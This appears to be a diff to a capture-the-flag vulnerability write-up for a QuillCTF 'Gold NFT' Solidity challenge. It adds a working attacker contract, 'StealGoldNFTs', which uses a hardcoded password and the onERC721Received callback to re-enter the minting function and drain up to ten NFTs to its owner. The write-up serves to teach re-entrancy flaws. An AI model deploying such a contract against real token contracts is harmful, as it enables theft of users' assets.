@@ -22,6 +22,50 @@ So by calling `set(bytes32,bool)`, we are able to set the bytes32 to a valid dat
 
 # Vulnerability Detail
 The _safeMint function called at https://github.com/pasDamola/QuillCTF-Gold-NFT/blob/88d92f7b9974de71c52bf5e94258adc0348ae0b8/contracts/GoldNFT.sol#L24 triggers the inherited https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7e7060e00e107460fc57c178859d3cf0c6ac64ef/contracts/token/ERC721/ERC721.sol#L247 which in turn triggers a callback to the destination address. 
+
+So a malicious contract can take advantage of this in this way;
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGoldNFT {
+    function takeOneNFT(bytes32 password) external;
+    function transferFrom(address from, address to, uint256 tokenId) external;
+}
+contract StealGoldNFTs {
+    IGoldNFT nfts;
+    address owner;
+    uint constant TOTAL_AMOUNT_TO_STEAL = 10;
+    // bytes32 password
+    bytes32 constant password = 0x70617373776f7264000000000000000000000000000000000000000000000000;
+    constructor(address _apesAddress) {
+        nfts = IGoldNFT(_apesAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external {
+        nfts.takeOneNFT(password);
+    }
+
+    function onERC721Received(
+        address _sender, address _from, uint256 _tokenId, bytes memory _data)
+        external returns (bytes4 retval) {
+        
+        require(msg.sender == address(nfts), "incorrect address");
+        nfts.transferFrom(address(this), owner, _tokenId);
+
+        if(_tokenId <= TOTAL_AMOUNT_TO_STEAL)  {
+            nfts.takeOneNFT(password);
+        }
+
+        return StealGoldNFTs.onERC721Received.selector;
+    }
+
+}
+```
+
+
+
 The contract then goes on to update the `minted` variable to true after the external call is made. This allows for re-entrancy attack
 
 # Impact
